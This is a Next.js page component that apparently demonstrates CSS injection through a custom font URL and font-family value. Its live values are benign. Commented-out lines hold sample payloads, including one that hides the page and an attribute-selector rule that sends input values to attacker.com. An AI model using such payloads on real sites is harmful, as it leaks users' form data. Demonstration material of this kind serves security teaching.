import type { Metadata } from 'next';

// import { headers } from 'next/headers';
import { CustomFont } from './CustomFont';

export const metadata: Metadata = {
  title: 'CSS Injection',
  description: 'An example of CSS injection',
};

const fetchCustomFont = async (): Promise<{ fontUrl: string; fontFamily: string }> => {
  // const fontUrl = `x');}
  //   body { display: none; }
  //   * { cursor: none !important; }`;
  const fontUrl = 'https://fonts.gstatic.com/s/playwritenzbasicguides/v1/R70Ijzkdl_2TLaCpQB6Y1nC0FVKKJvaZ2hDyljkrmGWAc5NV.woff2';
  // const fontFamily = `evil';}
  // body { display: none; }
  //   * { cursor: none !important; }`;
  const fontFamily = 'Playwrite NZ Basic Guides';

  // const fontFamily = `evil';}
  // input[value^="A"] { background: url(https://images.google.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png); }
  // input[value^="B"] { background: url(https://attacker.com/B); }
  // `;

  return { fontUrl, fontFamily };
};

export default async function Counter() {
  // const nonce = (await headers()).get('x-nonce') as string;
  const { fontUrl, fontFamily } = await fetchCustomFont();

  return (
    <>
      {/* <style nonce={nonce} suppressHydrationWarning>
        {
          `@font-face {
            font-family: '${cssEscape(fontFamily)}';
            font-style: normal;
            font-weight: 400;
            font-display: swap;
            src: url(${encodeURI(fontUrl)}) format('woff2');
          }`
        }
      </style> */}
      <form className="flex flex-col gap-4 max-w-sm mx-auto mt-8 p-6 bg-white dark:bg-zinc-900 shadow rounded-lg">
        <label htmlFor="input-A" className="text-sm font-medium text-zinc-700 dark:text-zinc-200 mb-2">
          Sample input
        </label>
        <input
          id="input-A"
          type="text"
          defaultValue="B"
          className="px-4 py-2 border border-zinc-300 dark:border-zinc-700 rounded-md bg-zinc-100 dark:bg-zinc-800 focus:outline-none focus:ring-2 focus:ring-blue-500"
        />
      </form>
      <CustomFont fontUrl={fontUrl} fontFamily={fontFamily} />
    </>
  );
};
